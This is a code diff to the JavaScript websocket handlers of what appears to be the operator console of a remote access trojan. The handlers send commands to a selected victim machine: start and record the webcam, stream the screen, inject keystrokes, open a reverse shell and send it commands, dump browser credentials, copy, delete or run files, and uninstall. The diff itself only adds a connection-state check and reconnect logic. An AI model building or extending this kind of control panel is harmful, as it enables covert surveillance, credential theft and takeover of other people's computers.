@@ -8,7 +8,7 @@ import {
     STOP_WEBCAM,
     WEBCAM_DEVICES
 } from "@redux/actions/webcamManagerActions";
-import {SELECT_CLIENT} from "@redux/actions/connectionActions";
+import {SELECT_CLIENT, WS_CONNECT} from "@redux/actions/connectionActions";
 
 import {
     KEY_EXECUTION,
@@ -21,13 +21,18 @@ import {DUMP_BROWSER} from "@redux/actions/credentialsActions";
 import {KEYBOARD_CONTROLLER} from "@redux/actions/keyboardControllerActions";
 import {SHOW_MESSAGE_BOX} from "@redux/actions/messsageBoxActions";
 import {DISCONNECT, RESTART, SYSTEM_STATE, UNINSTALL} from "@redux/actions/stateActions";
+import {disconnectClient} from "@redux/slices/clientSlice";
 
 
-const sendWebSocketMessage = (websocket, message) => {
+const sendWebSocketMessage = (websocket, message, store) => {
     try {
-        if (websocket) {
+        if (websocket && websocket.readyState === WebSocket.OPEN) {
             websocket.send(JSON.stringify(message));
             console.log("Message sent:", message);
+        } else {
+            console.warn("WebSocket is not open. Ready state:", websocket.readyState);
+            store.dispatch(disconnectClient({client_id: message.client_id}));
+            store.dispatch({type: WS_CONNECT});
         }
     } catch (error) {
         console.error("Error sending websocket message:", error);
@@ -41,7 +46,7 @@ export const handleSelectClient = (websocket, store, action) => {
         client_id: action.payload.client_id,
         set_null: action.payload.set_null
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
 
 };
 
@@ -51,7 +56,7 @@ export const handleRequestDisks = (websocket, store, action) => {
         sendDirectory: action.payload.sendDirectory,
         client_id: action.payload.client_id
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
 };
 
 export const handleCopy = (websocket, store, action) => {
@@ -61,7 +66,7 @@ export const handleCopy = (websocket, store, action) => {
         to_paths: action.payload.to_paths,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
 };
 
 export const handleMove = (websocket, store, action) => {
@@ -71,7 +76,7 @@ export const handleMove = (websocket, store, action) => {
         to_path: action.payload.to_paths[0],
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log(message);
     console.log("Moving !! mac: " + action.payload);
 }
@@ -82,7 +87,7 @@ export const handleDelete = (websocket, store, action) => {
         from_paths: action.payload,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log(message);
     console.log("Delete !! mac: " + action.payload);
 }
@@ -93,7 +98,7 @@ export const handleRun = (websocket, store, action) => {
         from_paths: action.payload,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log(message);
     console.log("Delete !! mac: " + action.payload);
 }
@@ -105,7 +110,7 @@ export const handleRequestDirectory = (websocket, store, action) => {
         client_id: action.payload.client_id,
         window_id: ""
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Sending message to " + action.payload.path);
 }
 
@@ -144,7 +149,7 @@ export const handleStartWebcam = async (websocket, store, action) => {
         fps: action.payload.fps,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Start webcam to " + action.payload);
 }
 
@@ -162,7 +167,7 @@ export const handleDownload = async (websocket, store, action) => {
         channel_id: response.channel_id,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Download to " + action.payload);
 }
 
@@ -171,7 +176,7 @@ export const handleStopWebcam = (websocket, store, action) => {
         ACTION: STOP_WEBCAM,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Stop webcam to " + action.payload);
 }
 
@@ -180,7 +185,7 @@ export const handleStartRecording = (websocket, store, action) => {
         ACTION: START_RECORDING_WEBCAM,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Stop webcam to " + action.payload);
 }
 
@@ -189,7 +194,7 @@ export const handleStopRecording = (websocket, store, action) => {
         ACTION: STOP_RECORDING_WEBCAM,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Stop webcam to " + action.payload);
 }
 
@@ -205,7 +210,7 @@ export const handleSendWebcamRecords = async (websocket, store, action) => {
         channel_id: response.channel_id,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Send webcam to " + action.payload);
 }
 
@@ -214,7 +219,7 @@ export const handleWebcamDevices = async (websocket, store, action) => {
         ACTION: WEBCAM_DEVICES,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Download to " + action.payload);
 }
 
@@ -233,7 +238,7 @@ export const handleStartStreaming = async (websocket, store, action) => {
         monitor_id: action.payload.monitor_id,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Start streaming to " + action.payload);
 }
 
@@ -242,7 +247,7 @@ export const handleStopStreaming = (websocket, store, action) => {
         ACTION: STOP_SCREEN_STREAMING,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Stop streaming to " + action.payload);
 }
 
@@ -251,7 +256,7 @@ export const handleMonitors = (websocket, store, action) => {
         ACTION: MONITORS,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Requesting monitors to " + action.payload);
 }
 
@@ -261,7 +266,7 @@ export const handleKey = (websocket, store, action) => {
         key: JSON.stringify(action.payload),
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Request key execution to " + action.payload);
 }
 
@@ -270,7 +275,7 @@ export const handleStartReverseShell = (websocket, store, action) => {
         ACTION: START_REVERSE_SHELL,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Request start shell execution to " + action.payload);
 }
 
@@ -280,7 +285,7 @@ export const handleSendCommandReverseShell = (websocket, store, action) => {
         command: action.payload,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Request start shell execution to " + action.payload);
 }
 
@@ -295,7 +300,7 @@ export const handleDumpBrowser = async (websocket, store, action) => {
         channel_id: response.channel_id,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Request browser execution to " + action.payload);
 }
 
@@ -306,7 +311,7 @@ export const handleKeyboardController = async (websocket, store, action) => {
         command: action.payload.command,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Request browser execution to " + action.payload);
 }
 
@@ -317,7 +322,7 @@ export const handleMessageBox = async (websocket, store, action) => {
         info: action.payload.info,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Request message box to " + action.payload);
 }
 
@@ -327,7 +332,7 @@ export const handleSystemState = async (websocket, store, action) => {
         type: action.payload,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Request message box to " + action.payload);
 }
 
@@ -337,7 +342,7 @@ export const handleDisconnect = async (websocket, store, action) => {
         ACTION: DISCONNECT,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Request message box to " + action.payload);
 }
 
@@ -346,7 +351,7 @@ export const handleRestartConnection = async (websocket, store, action) => {
         ACTION: RESTART,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Request message box to " + action.payload);
 }
 
@@ -355,7 +360,7 @@ export const handleUninstall = async (websocket, store, action) => {
         ACTION: UNINSTALL,
         client_id: store.getState().client.selectedClient.systemInformation.UUID
     };
-    sendWebSocketMessage(websocket, message);
+    sendWebSocketMessage(websocket, message, store);
     console.log("Request message box to " + action.payload);
 }
 
